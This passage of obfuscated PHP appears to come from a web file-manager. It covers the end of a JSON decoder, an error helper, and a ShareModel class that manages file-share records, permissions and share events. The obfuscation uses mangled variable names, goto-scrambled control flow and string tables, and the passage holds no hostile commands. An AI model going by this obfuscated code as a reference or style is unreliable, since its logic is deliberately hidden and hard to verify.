$f„—á‘Ã¿[153] && in_array($A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_IN_ARR, $f„—á‘Ã¿[259] => $C„§¦×”¯‰, $f„—á‘Ã¿[1927] => !1)); } elseif ($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[472] && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] == SERVICES_JSON_IN_ARR) { array_pop($Fƒ¾êä‘³); } elseif ($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[1056] && in_array($A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_IN_OBJ, $f„—á‘Ã¿[259] => $C„§¦×”¯‰, $f„—á‘Ã¿[1927] => !1)); } elseif ($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[311] && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] == SERVICES_JSON_IN_OBJ) { array_pop($Fƒ¾êä‘³); } elseif ($FÒÒà†ÒöÍ == $f„—á‘Ã¿[1930] && in_array($A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_IN_CMT, $f„—á‘Ã¿[259] => $C„§¦×”¯‰, $f„—á‘Ã¿[1927] => !1)); $C„§¦×”¯‰++; } elseif ($FÒÒà†ÒöÍ == $f„—á‘Ã¿[1931] && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] == SERVICES_JSON_IN_CMT) { array_pop($Fƒ¾êä‘³); $C„§¦×”¯‰++; for ($bŠ“—Ù¾ší = $A¿„¸Òºµ¼[$f„—á‘Ã¿[259]]; $bŠ“—Ù¾ší <= $C„§¦×”¯‰; ++$bŠ“—Ù¾ší) { $c¹¹…”‰­ˆ = substr_replace($c¹¹…”‰­ˆ, $f„—á‘Ã¿[50], $bŠ“—Ù¾ší, 1); } } } if (reset($Fƒ¾êä‘³) == SERVICES_JSON_IN_ARR) { return $cÇ²¸ ‡˜ğ; } elseif (reset($Fƒ¾êä‘³) == SERVICES_JSON_IN_OBJ) { return $f¹Ó´à–‹¼; } goto Bˆ½Æ™âæë; a§ÈêÍ‘·: $c¹¹…”‰­ˆ = $this->reduce_string($c¹¹…”‰­ˆ); if ($c¹¹…”‰­ˆ == $f„—á‘Ã¿[33]) { if (reset($Fƒ¾êä‘³) == SERVICES_JSON_IN_ARR) { return $cÇ²¸ ‡˜ğ; } else { return $f¹Ó´à–‹¼; } } $dàÊèÖõ„ = strlen($c¹¹…”‰­ˆ); goto A›îˆ„é°; Bˆ½Æ™âæë: } } } function isError($cĞÀçªÌ²å, $aïåÏèŠ‚ä = null) { $CÓ½ìÃ•ˆ =& $_SERVER[»„]; if (class_exists($CÓ½ìÃ•ˆ[1932])) { return PEAR::isError($cĞÀçªÌ²å, $aïåÏèŠ‚ä); } elseif (is_object($cĞÀçªÌ²å) && (get_class($cĞÀçªÌ²å) == $CÓ½ìÃ•ˆ[1933] || is_subclass_of($cĞÀçªÌ²å, $CÓ½ìÃ•ˆ[1933]))) { return !0; } return !1; } } goto f‰’‹–à§ˆ; f¨´äÔÃ: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\145"; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\x74\54\x75\160\x64\141\164\145", "\x66\x75\156\143\x74\x69\x6f\x6e"), array("\x63\x72\x65\x61\x74\x65\124\x69\155\x65", "\164\151\x6d\145", "\151\156\x73\145\162\x74", "\146\165\156\x63\164\x69\x6f\x6e"), array("\x6f\160\x74\151\157\156\163", '', "\151\156\163\145\162\x74\x2c\x75\x70\x64\141\164\x65\54\x73\x65\x6c\x65\143\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($e¼®ËìŸ•ï) { $c´¥Šëµ» =& $_SERVER[»„]; $C·èñ‚Ñ¿¨ = isset($e¼®ËìŸ•ï[0]) ? $e¼®ËìŸ•ï[0] : !1; return array($c´¥Šëµ»[2177] => array(USER_ID, $c´¥Šëµ»[2178]), $c´¥Šëµ»[2140] => array($C·èñ‚Ñ¿¨, $c´¥Šëµ»[2179])); } protected function listSimple() { $e¨»ƒ¦Í…Ä = array($_SERVER[»„][1409] => USER_ID); $D¥¯­ óøõ = $this->field($this->fieldList)->where($e¨»ƒ¦Í…Ä)->select(); return $D¥¯­ óøõ ? $D¥¯­ óøõ : array(); } protected function getInfo($b˜·ŸçîÉ­, $DÂª÷½ÒŞİ = false) { $CÏÀø©Ÿæ¸ =& $_SERVER[»„]; if ($DÂª÷½ÒŞİ) { return $this->_getShareInfo(array($CÏÀø©Ÿæ¸[437] => $b˜·ŸçîÉ­)); } $EÍ­¯¬¢Å¥ = $this->cacheFunctionGet($CÏÀø©Ÿæ¸[2180], $b˜·ŸçîÉ­); return $EÍ­¯¬¢Å¥; } public function getInfoByHash($C’ƒßÁÍŒÔ) { return $this->_getShareInfo(array($_SERVER[»„][439] => $C’ƒßÁÍŒÔ)); } public function getInfoByPath($fÉµøç»‚—) { $E­é¨äÍ¦Ğ =& $_SERVER[»„]; $fô¸¥Ô¹Ú = array($E­é¨äÍ¦Ğ[1409] => USER_ID, $E­é¨äÍ¦Ğ[365] => $fÉµøç»‚—); return $this->_getShareInfo($fô¸¥Ô¹Ú); } public function getInfoBySourcePath($B ŒøŸÛÁ) { $Fİ’ğ±­ÈÆ =& $_SERVER[»„]; $d¢’ÙÎåÓ = array($Fİ’ğ±­ÈÆ[1409] => USER_ID, $Fİ’ğ±­ÈÆ[1006] => $B ŒøŸÛÁ); return $this->_getShareInfo($d¢’ÙÎåÓ); } private function _getShareInfo($b³•â“„Şª) { goto E•ÖÓâ¯«–; a—Äó¡ª©™: $b³•â“„Şª = array($FÊïéŞÕºì[437] => $C“¼¼œº¾Ê[$FÊïéŞÕºì[437]]); $dÌä²ô¾  = $FÊïéŞÕºì[2181]; $aä—¥õƒ¸” = Model($FÊïéŞÕºì[533])->order($FÊïéŞÕºì[363])->field($dÌä²ô¾ )->where($b³•â“„Şª)->select(); goto dÚÑ‡¾‘éÈ; E•ÖÓâ¯«–: $FÊïéŞÕºì =& $_SERVER[»„]; $C“¼¼œº¾Ê = $this->where($b³•â“„Şª)->find(); if (!$C“¼¼œº¾Ê) { return !1; } goto a—Äó¡ª©™; dÚÑ‡¾‘éÈ: if ($C“¼¼œº¾Ê[$FÊïéŞÕºì[365]] == $FÊïéŞÕºì[464]) { $C“¼¼œº¾Ê[$FÊïéŞÕºì[387]] = IO::info($C“¼¼œº¾Ê[$FÊïéŞÕºì[1006]]); } else { $C“¼¼œº¾Ê[$FÊïéŞÕºì[387]] = Model($FÊïéŞÕºì[1098])->pathInfo($C“¼¼œº¾Ê[$FÊïéŞÕºì[365]]); } $C“¼¼œº¾Ê[$FÊïéŞÕºì[2182]] = $aä—¥õƒ¸”; return $C“¼¼œº¾Ê; goto eæß´…¼ßÑ; eæß´…¼ßÑ: } protected function getInfoAuth($cÄ¿÷‡…Ù) { $E§–®™ÍÜŒ =& $_SERVER[»„]; $eóÛĞ™¹Ü = $this->getInfo($cÄ¿÷‡…Ù); $eóÛĞ™¹Ü[$E§–®™ÍÜŒ[372]] = Model($E§–®™ÍÜŒ[450])->authMake($eóÛĞ™¹Ü[$E§–®™ÍÜŒ[2182]]); return $eóÛĞ™¹Ü; } protected function listData($B…Ã‰¬Úà† = null, $d¾­éîÄ = 300) { $A–‰‰èÂË =& $_SERVER[»„]; $cà¡†×ƒŠ = array(array($A–‰‰èÂË[442] => array($A–‰‰èÂË[916], 0), $A–‰‰èÂË[444] => array($A–‰‰èÂË[916], 0), $A–‰‰èÂË[2183] => $A–‰‰èÂË[2152])); if ($B…Ã‰¬Úà† == $A–‰‰èÂË[1839]) { $cà¡†×ƒŠ = array($A–‰‰èÂË[442] => 1); } else { if ($B…Ã‰¬Úà† == $A–‰‰èÂË[995]) { $cà¡†×ƒŠ = array($A–‰‰èÂË[444] => 1); } } $cà¡†×ƒŠ[$A–‰‰èÂË[1409]] = USER_ID; $Dµ—É¤‡Ç = $this->where($cà¡†×ƒŠ)->selectPage($d¾­éîÄ); return $Dµ—É¤‡Ç; } protected function listToMe($d¹¶ó­ìË© = 300) { goto eí°¾Àê; e“‚Ã‘Æ: $Aš”Èìá‚è = array_to_keyvalue_group($fŸİ¼‡ë‹è[$C ù­”¡Ë½[350]], $C ù­”¡Ë½[437]); if (!$Aš”Èìá‚è) { return $fŸİ¼‡ë‹è; } $bÕ˜·Ü°Ô¹ = $C ù­”¡Ë½[2185]; goto dºöèÏ‡‡ê; dºöèÏ‡‡ê: $FÌöæ†©¶ = array($C ù­”¡Ë½[437] => array($C ù­”¡Ë½[380], array_keys($Aš”Èìá‚è))); $eë»ïß¿ƒ• = $this->field($bÕ˜·Ü°Ô¹)->where($FÌöæ†©¶)->select(); foreach ($eë»ïß¿ƒ• as $CÃ‡ÂŸ÷ => &$e‚È¦Öé) { $e‚È¦Öé[$C ù­”¡Ë½[2182]] = $Aš”Èìá‚è[$e‚È¦Öé[$C ù­”¡Ë½[437]]]; } goto e¹Ñ§”­ğ‡; eí°¾Àê: $C ù­”¡Ë½ =& $_SERVER[»„]; $a‰Ù˜“ğ = Session::get($C ù­”¡Ë½[2184]); $BÔ©‡¿½ÔÜ = array_to_keyvalue($a‰Ù˜“ğ, $C ù­”¡Ë½[33], $C ù­”¡Ë½[2072]); goto eÏğîˆÒ¨; e¹Ñ§”­ğ‡: $FË«±Öñ½¶ = array($C ù­”¡Ë½[2186] => $eë»ïß¿ƒ•, $C ù­”¡Ë½[2187] => $fŸİ¼‡ë‹è[$C ù­”¡Ë½[347]]); return $FË«±Öñ½¶; goto AõÓË”å†ª; eÏğîˆÒ¨: $FÌöæ†©¶ = array($C ù­”¡Ë½[517] => SourceModel::TYPE_USER, $C ù­”¡Ë½[452] => USER_ID); if ($BÔ©‡¿½ÔÜ) { $FÌöæ†©¶ = array(array($C ù­”¡Ë½[517] => SourceModel::TYPE_USER, $C ù­”¡Ë½[452] => USER_ID), array($C ù­”¡Ë½[517] => SourceModel::TYPE_GROUP, $C ù­”¡Ë½[452] => array($C ù­”¡Ë½[7], $BÔ©‡¿½ÔÜ)), $C ù­”¡Ë½[2183] => $C ù­”¡Ë½[2152]); } $fŸİ¼‡ë‹è = Model($C ù­”¡Ë½[533])->where($FÌöæ†©¶)->selectPage($d¹¶ó­ìË©); goto e“‚Ã‘Æ; AõÓË”å†ª: } protected function shareAdd($C©‹ÅÈÑˆ, $A‡°ë²ÉĞß) { $dÔåª³ÉŞï =& $_SERVER[»„]; $fàè–¹Æ°ª = $this->_addShareData($C©‹ÅÈÑˆ, $A‡°ë²ÉĞß); if (!empty($A‡°ë²ÉĞß[$dÔåª³ÉŞï[2188]])) { $this->_shareAuthSet($fàè–¹Æ°ª, $A‡°ë²ÉĞß[$dÔåª³ÉŞï[2188]]); } $this->shareEventAdd($C©‹ÅÈÑˆ, $A‡°ë²ÉĞß, $dÔåª³ÉŞï[998]); return $fàè–¹Æ°ª; } private function shareEventAdd($CäƒèŒ›œ‘, $fÚ«çá°ãŞ, $AÉÅ›…ÛïÓ = "\x61\x64\144") { goto DÜÄóæì…È; DÜÄóæì…È: $bñ‚Í½÷¾— =& $_SERVER[»„]; if ($AÉÅ›…ÛïÓ == $bñ‚Í½÷¾—[998]) { if ($fÚ«çá°ãŞ[$bñ‚Í½÷¾—[442]] == $bñ‚Í½÷¾—[83]) { Model($bñ‚Í½÷¾—[501])->eventShare($CäƒèŒ›œ‘, $bñ‚Í½÷¾—[2189]); } if ($fÚ«çá°ãŞ[$bñ‚Í½÷¾—[444]] == $bñ‚Í½÷¾—[83]) { Model($bñ‚Í½÷¾—[501])->eventShare($CäƒèŒ›œ‘, $bñ‚Í½÷¾—[2190]); } return; } $F‹àÏå½ ‹ = $this->getInfoByPath($CäƒèŒ›œ‘); goto CêÍ–Èê; CêÍ–Èê: $A—°Š¢¤ù = $bñ‚Í½÷¾—[2191]; if ($F‹àÏå½ ‹[$bñ‚Í½÷¾—[442]] == $bñ‚Í½÷¾—[464] && $fÚ«çá°ãŞ[$bñ‚Í½÷¾—[442]] == $bñ‚Í½÷¾—[83]) { $A—°Š¢¤ù = $bñ‚Í½÷¾—[2189]; } if ($F‹àÏå½ ‹[$bñ‚Í½÷¾—[442]] == $bñ‚Í½÷¾—[83] && $fÚ«çá°ãŞ[$bñ‚Í½÷¾—[442]] == $bñ‚Í½÷¾—[464]) { $A—°Š¢¤ù = $bñ‚Í½÷¾—[2192]; } goto dàù«¼õŸä; dàù«¼õŸä: if ($F‹àÏå½ ‹[$bñ‚Í½÷¾—[444]] == $bñ‚Í½÷¾—[464] && $fÚ«çá°ãŞ[$bñ‚Í½÷¾—[444]] == $bñ‚Í½÷¾—[83]) { $A—°Š¢¤ù = $bñ‚Í½÷¾—[2190]; } if ($F‹àÏå½ ‹[$bñ‚Í½÷¾—[444]] == $bñ‚Í½÷¾—[83] && $fÚ«çá°ãŞ[$bñ‚Í½÷¾—[444]] == $bñ‚Í½÷¾—[464]) { $A—°Š¢¤ù = $bñ‚Í½÷¾—[2193]; } Model($bñ‚Í½÷¾—[501])->eventShare($CäƒèŒ›œ‘, $A—°Š¢¤ù); goto cå÷˜‰¼×; cå÷˜‰¼×: return; goto FÇ¶—¥£áÕ; FÇ¶—¥£áÕ: } private function _addShareData($a˜İ…°ªë, $B Œ¼°‹­ = array()) { goto Eµ•š°ò¥Í; bš…‡Æ…—: return $D´‰æ‹ƒô; goto CÑŒ¹ğÁ«; e…¥¾çÛáŠ: $D´‰æ‹ƒô = $this->add($b”²æˆè¬ğ); $C˜™¹øæ‘¼ = array($e¿¥ªë[439] => short_id($D´‰æ‹ƒô)); $this->where(array($e¿¥ªë[436] => $D´‰æ‹ƒô))->save($C˜™¹øæ‘¼); goto bš…‡Æ…—; A ”¦Ñ×Éâ: $b”²æˆè¬ğ = array($e¿¥ªë[1400] => USER_ID, $e¿¥ªë[379] => $a˜İ…°ªë, $e¿¥ªë[1316] => $e¿¥ªë[33], $e¿¥ªë[442] => 0, $e¿¥ªë[444] => 0, $e¿¥ªë[1006] => $e¿¥ªë[33], $e¿¥ªë[291] => $e¿¥ªë[33], $e¿¥ªë[792] => $e¿¥ªë[33], $e¿¥ªë[2195] => 0, $e¿¥ªë[2196] => 0, $e¿¥ªë[691] => 0, $e¿¥ªë[2197] => $e¿¥ªë[33], $e¿¥ªë[439] => $e¿¥ªë[33]); $aÁ¬ù„™† = explode($e¿¥ªë[47], $e¿¥ªë[2198]); foreach ($aÁ¬ù„™† as $A—ğªŠ—İÀ) { if (!isset($B Œ¼°‹­[$A—ğªŠ—İÀ])) { continue; } $b”²æˆè¬ğ[$A—ğªŠ—İÀ] = $B Œ¼°‹­[$A—ğªŠ—İÀ]; } goto e…¥¾çÛáŠ; Eµ•š°ò¥Í: $e¿¥ªë =& $_SERVER[»„]; $aÅí§ô½µÛ = array($e¿¥ªë[379] => $a˜İ…°ªë, $e¿¥ªë[1400] => USER_ID); if ($a˜İ…°ªë == 0) { $aÅí§ô½µÛ = array($e¿¥ªë[2194] => $B Œ¼°‹­[$e¿¥ªë[1006]], $e¿¥ªë[1400] => USER_ID); } goto bÁ¢Ÿ‹Ü¤; bÁ¢Ÿ‹Ü¤: if ($aÆ’Šª„¾ = $this->where($aÅí§ô½µÛ)->find()) { return $aÆ’Šª„¾[$e¿¥ªë[437]]; } if ($a˜İ…°ªë == 0) { $B´ÜóĞ»ô“ = array($e¿¥ªë[28] => get_path_this($B Œ¼°‹­[$e¿¥ªë[75]])); } else { $B´ÜóĞ»ô“ = Model($e¿¥ªë[740])->sourceInfo($a˜İ…°ªë); if (!$B´ÜóĞ»ô“) { return !1; } } if (!$B Œ¼°‹­[$e¿¥ªë[1316]]) { $B Œ¼°‹­[$e¿¥ªë[1316]] = $B´ÜóĞ»ô“[$e¿¥ªë[28]]; } goto A ”¦Ñ×Éâ; CÑŒ¹ğÁ«: } private function _shareAuthSet($EçáâÖƒè, $cÒ¶­Ï…) { goto E‹êÇª¼íê; E‹êÇª¼íê: $fÑÅ×©‘ªº =& $_SERVER[»„]; if (!is_array($cÒ¶­Ï…)) { return !1; } $Cè«¤«©‡ = Model($fÑÅ×©‘ªº[2199]); goto eùÌ†µ˜–ğ; eùÌ†µ˜–ğ: $Cè«¤«©‡->where(array($fÑÅ×©‘ªº[437] => $EçáâÖƒè))->delete(); $D©ˆÃ°›Ç = array(); foreach ($cÒ¶­Ï… as $A½Š÷³˜‡Œ) { $b¼íóÙ¹Ê• = SourceModel::TYPE_USER; if ($A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[367]] == SourceModel::TYPE_GROUP) { $b¼íóÙ¹Ê• = SourceModel::TYPE_GROUP; } $fƒõÖè†¥ = array($fÑÅ×©‘ªº[437] => $EçáâÖƒè, $fÑÅ×©‘ªº[367] => $b¼íóÙ¹Ê•, $fÑÅ×©‘ªº[452] => intval($A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[452]]), $fÑÅ×©‘ªº[2200] => 0, $fÑÅ×©‘ªº[2201] => -1); if ($A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[2200]]) { $fƒõÖè†¥[$fÑÅ×©‘ªº[2200]] = $A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[2200]]; } else { if ($A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[2201]]) { $fƒõÖè†¥[$fÑÅ×©‘ªº[2201]] = $A½Š÷³˜‡Œ[$fÑÅ×©‘ªº[2201]]; } } $D©ˆÃ°›Ç[] = $fƒõÖè†¥; } goto D¯öš×Ù; D¯öš×Ù: return $Cè«¤«©‡->addAll($D©ˆÃ°›Ç, array(), !0); goto eÇÇ±ÑÀ¹‚; eÇÇ±ÑÀ¹‚: } public function numViewAdd($d¦áŠ„Ëƒ¥) { $EâÒ¼Èƒ„ =& $_SERVER[»„]; $A¤¹ ¨ãÀ = array($EâÒ¼Èƒ„[436] => $d¦áŠ„Ëƒ¥); $this->where($A¤¹ ¨ãÀ)->setAdd($EâÒ¼Èƒ„[2195]); } public function numDownloadAdd($DÂ´¤Ä—Â) { $C×‘±šÍ‰ø =& $_SERVER[»„]; $dÇ¶‘¾™‚Š = array($C×‘±šÍ‰ø[436] => $DÂ´¤Ä—Â); $this->where($dÇ¶‘¾™‚Š)->setAdd($C×‘±šÍ‰ø[2196]); } protected function shareEdit($CÊÚ¾Ä´î², $CË¾ëä‰ß) { goto b Áì†Ä; CêÕÈÍ³ÏÊ: if (isset($CË¾ëä‰ß[$E—ÖóæÉÂÃ[2188]])) { $this->_shareAuthSet($CÊÚ¾Ä´î², $CË¾ëä‰ß[$E—ÖóæÉÂÃ[2188]]); } return !0; goto A»ğÔƒğƒ¨; b Áì†Ä: $E—ÖóæÉÂÃ =& $_SERVER[»„]; $C–¶¬Î‹í = $this->getInfo($CÊÚ¾Ä´î²); if (!$C–¶¬Î‹í) { return !1; } goto eÍÌ›Å“”; eÍÌ›Å“”: $this->_checkLinkShare($CË¾ëä‰ß, $C–¶¬Î‹í); $dà¤ÁàÈŸª = array(); $bËŒÜâ¿Á– = explode($E—ÖóæÉÂÃ[47], $E—ÖóæÉÂÃ[2202]); goto CŠœÁË±¬; CŠœÁË±¬: foreach ($bËŒÜâ¿Á– as $Bò±ØŸ´¾“) { if (!array_key_exists($Bò±ØŸ´¾“, $CË¾ëä‰ß)) { continue; } $dà¤ÁàÈŸª[$Bò±ØŸ´¾“] = $CË¾ëä‰ß[$Bò±ØŸ´¾“]; } $this->shareEventAdd($C–¶¬Î‹í[$E—ÖóæÉÂÃ[365]], $CË¾ëä‰ß, $E—ÖóæÉÂÃ[2040]); $this->where(array($E—ÖóæÉÂÃ[436] => $CÊÚ¾Ä´î²))->save($dà¤ÁàÈŸª); goto CêÕÈÍ³ÏÊ; A»ğÔƒğƒ¨: } private function _checkLinkShare($C“×¦çîÊù, $fÜ’ÌØ÷ñ) { goto bÉ±‘òùÚ÷; B³´‹†ò±õ: $C×„’¼è‚ = $this->shareFileMeta($cİ¨àöœ’[$E“¼æ¡š½[415]]); if (isset($C×„’¼è‚[$E“¼æ¡š½[355]]) && $C×„’¼è‚[$E“¼æ¡š½[355]] == $E“¼æ¡š½[83]) { show_json(LNG($E“¼æ¡š½[2205]), !1); } goto Cİ±›¹ÅÏÑ; F®…ÑÕà®: if ($fÜ’ÌØ÷ñ[$E“¼æ¡š½[387]][$E“¼æ¡š½[29]] != $E“¼æ¡š½[163]) { $DéÅÆ—ğË¥ = $this->_folderReport($d¥ÚÉ°±ïÊ); if (!$DéÅÆ—ğË¥) { return; } show_json(LNG($E“¼æ¡š½[2203]) . $E“¼æ¡š½[2204] . $DéÅÆ—ğË¥, !1); } $cİ¨àöœ’ = Model($E“¼æ¡š½[740])->fileInfoGet($fÜ’ÌØ÷ñ[$E“¼æ¡š½[387]][$E“¼æ¡š½[365]]); if (!$cİ¨àöœ’) { return; } goto B³´‹†ò±õ; bÉ±‘òùÚ÷: $E“¼æ¡š½ =& $_SERVER[»„]; if ($C“×¦çîÊù[$E“¼æ¡š½[442]] != $E“¼æ¡š½[83]) { return; } $d¥ÚÉ°±ïÊ = $fÜ’ÌØ÷ñ[$E“¼æ¡š½[387]][$E“¼æ¡š½[365]]; goto F®…ÑÕà®; Cİ±›¹ÅÏÑ: } private function _folderReport($E©Ìâ“´ È) { goto Aà¶¶É¦Û; Aâ¦Ô®½¾Ú: $D“ê«‘ùì® = substr($AÃÕŸ™¾[$b‘¾Ä‹…¢è[455]], strpos($AÃÕŸ™¾[$b‘¾Ä‹…¢è[455]], $Fù„‚Èó)); $b¨‹æ¥¯ô© = array($b‘¾Ä‹…¢è[365] => array($b‘¾Ä‹…¢è[7], trim($D“ê«‘ùì®, $b‘¾Ä‹…¢è[47]))); $AÄ‰˜Øåó = Model($b‘¾Ä‹…¢è[740])->where($b¨‹æ¥¯ô©)->field($b‘¾Ä‹…¢è[28])->select(); goto aª‚–ÔŞÀ; BŸ¢ƒ¾å¬ˆ: $b¨‹æ¥¯ô© = array($b‘¾Ä‹…¢è[415] => array($b‘¾Ä‹…¢è[7], $d™—èõÎ˜Û), $b‘¾Ä‹…¢è[455] => array($b‘¾Ä‹…¢è[739], "\45{$Fù„‚Èó}\45"), $b‘¾Ä‹…¢è[393] => 0); $AÃÕŸ™¾ = Model($b‘¾Ä‹…¢è[740])->where($b¨‹æ¥¯ô©)->field($b‘¾Ä‹…¢è[2207])->find(); if (!$AÃÕŸ™¾) { return !1; } goto Aâ¦Ô®½¾Ú; cİí¸›£Ø‚: if (!$d™—èõÎ˜Û) { return !1; } $d™—èõÎ˜Û = array_to_keyvalue($d™—èõÎ˜Û, $b‘¾Ä‹…¢è[33], $b‘¾Ä‹…¢è[415]); $Fù„‚Èó = $b‘¾Ä‹…¢è[47] . $E©Ìâ“´ È . $b‘¾Ä‹…¢è[47]; goto BŸ¢ƒ¾å¬ˆ; aª‚–ÔŞÀ: $a¨‹¸§‡¨ = array_to_keyvalue($AÄ‰˜Øåó, $b‘¾Ä‹…¢è[33], $b‘¾Ä‹…¢è[28]); $a¨‹¸§‡¨[] = $AÃÕŸ™¾[$b‘¾Ä‹…¢è[28]]; return implode($b‘¾Ä‹…¢è[8], $a¨‹¸§‡¨); goto f­É³ÌœÁ÷; Aà¶¶É¦Û: $b‘¾Ä‹…¢è =& $_SERVER[»„]; $b¨‹æ¥¯ô© = array($b‘¾Ä‹…¢è[415] => array($b‘¾Ä‹…¢è[916], 0), $b‘¾Ä‹…¢è[677] => 3); $d™—èõÎ˜Û = Model($b‘¾Ä‹…¢è[2206])->where($b¨‹æ¥¯ô©)->field($b‘¾Ä‹…¢è[415])->select(); goto cİí¸›£Ø‚; f­É³ÌœÁ÷: } protected function remove($fŠÊŞø†‚) { goto dø±‰³È¢; Fçò¹Õè³: $Aƒ®äÜ¶ã´ = $this->where($aŠÍæÀ´Œ)->delete(); if ($Aƒ®äÜ¶ã´) { Model($D„Õä ƒÉ£[533])->where(array($D„Õä ƒÉ£[437] => $fŠÊŞø†‚))->delete(); } $f£‡çœäã = is_array($fŠÊŞø†‚) ? $fŠÊŞø†‚[1] : array($fŠÊŞø†‚); goto c“®ä¦ø÷; dø±‰³È¢: $D„Õä ƒÉ£ =& $_SERVER[»„]; if (is_array($fŠÊŞø†‚)) { $fŠÊŞø†‚ = array($D„Õä ƒÉ£[7], $fŠÊŞø†‚); } $aŠÍæÀ´Œ = array($D„Õä ƒÉ£[437] => $fŠÊŞø†‚); goto Fçò¹Õè³; c“®ä¦ø÷: for ($bäßã”Œï» = 0; $bäßã”Œï» < count($f£‡çœäã); $bäßã”Œï»++) { $eÜ¹Æìù = $this->getInfo($f£‡çœäã[$bäßã”Œï»]); if ($eÜ¹Æìù[$D„Õä ƒÉ£[444]] == $D„Õä ƒÉ£[83]) { Model($D„Õä ƒÉ£[501])->eventShare($eÜ¹Æìù[$D„Õä ƒÉ£[365]], $D„Õä ƒÉ£[2193]); } if ($eÜ¹Æìù[$D„Õä ƒÉ£[442]] == $D„Õä ƒÉ£[83]) { Model($D„Õä ƒÉ£[501])->eventShare($eÜ¹Æìù[$D„Õä ƒÉ£[365]], $D„Õä ƒÉ£[2192]); } } return $Aƒ®äÜ¶ã´; goto aê½ÛÜæ¢Ä; aê½ÛÜæ¢Ä: } protected function removeBySource($d††¦ãì) { goto CÄ‡óè£ÌÚ; CÄ‡óè£ÌÚ: $F›À‰—”Ô‚ =& $_SERVER[»„]; $d¿ˆ®¯…‘‰ = array($F›À‰—”Ô‚[379] => array($F›À‰—”Ô‚[380], $d††¦ãì)); $D¤øñÌöÖ = $this->field($F›À‰—”Ô‚[437])->where($d¿ˆ®¯…‘‰)->select(); goto cˆ—áá¹ƒÛ; A’§Ñ¶„›³: $this->where($d¿ˆ®¯…‘‰)->delete(); Model($F›À‰—”Ô‚[533])->where($d¿ˆ®¯…‘‰)->delete(); goto dË±ë£ˆÎƒ; cˆ—áá¹ƒÛ: $D¤øñÌöÖ = array_to_keyvalue($D¤øñÌöÖ, $F›À‰—”Ô‚[33], $F›À‰—”Ô‚[437]); if (!$D¤øñÌöÖ) { return; } $d¿ˆ®¯…‘‰ = array($F›À‰—”Ô‚[436] => array($F›À‰—”Ô‚[380], $D¤øñÌöÖ)); goto A’§Ñ¶„›³; dË±ë£ˆÎƒ: } public function listAll($D‘Ã‡ãÑ’ä) { goto b‘ƒßé‹ƒª; BØëØœï‹: if ($D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[690]]) { $F±©‹çè©” = $D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[691]] ? $D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[691]] : strtotime(date($Eä·£ù¸‚[2208])); $d •ê¤ÓÑµ[$Eä·£ù¸‚[183]] = array($Eä·£ù¸‚[317], array($D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[690]], $F±©‹çè©”)); } if ($D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[29]]) { $d •ê¤ÓÑµ[$D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[29]]] = 1; } else { $d •ê¤ÓÑµ[] = array($Eä·£ù¸‚[442] => array($Eä·£ù¸‚[916], 0), $Eä·£ù¸‚[444] => array($Eä·£ù¸‚[916], 0), $Eä·£ù¸‚[2183] => $Eä·£ù¸‚[2152]); } if ($D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[2148]]) { $d •ê¤ÓÑµ[] = array($Eä·£ù¸‚[439] => $D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[2148]], $Eä·£ù¸‚[1316] => array($Eä·£ù¸‚[739], "\45{$D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[2148]]}\45"), $Eä·£ù¸‚[2183] => $Eä·£ù¸‚[2152]); } goto bˆ…µê÷Š„; bˆ…µê÷Š„: $BâÆ¨×ôÈ = $this->_makeOrder()->where($d •ê¤ÓÑµ)->selectPage(20); if (empty($BâÆ¨×ôÈ[$Eä·£ù¸‚[350]])) { return array(); } $this->_listDataApply($BâÆ¨×ôÈ[$Eä·£ù¸‚[350]]); goto dÂƒòó‚¿„; b‘ƒßé‹ƒª: $Eä·£ù¸‚ =& $_SERVER[»„]; $d •ê¤ÓÑµ = array(); if ($D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[1409]]) { $d •ê¤ÓÑµ[$Eä·£ù¸‚[1409]] = $D‘Ã‡ãÑ’ä[$Eä·£ù¸‚[1409]]; } goto BØëØœï‹; dÂƒòó‚¿„: return $BâÆ¨×ôÈ; goto E£ƒ¬¿ùâ¤; E£ƒ¬¿ùâ¤: } public function listDataApply($Ağ–Ã—ê¼) { $this->_listDataApply($Ağ–Ã—ê¼); return $Ağ–Ã—ê¼; } private function _listDataApply(&$d˜‘Î©ô) { $d…÷šÎğÉ¾ =& $_SERVER[»„]; $d„‘ÒœÌÖ£ = array_to_keyvalue($d˜‘Î©ô, $d…÷šÎğÉ¾[33], $d…÷šÎğÉ¾[1409]); $D¤Üªë˜é = 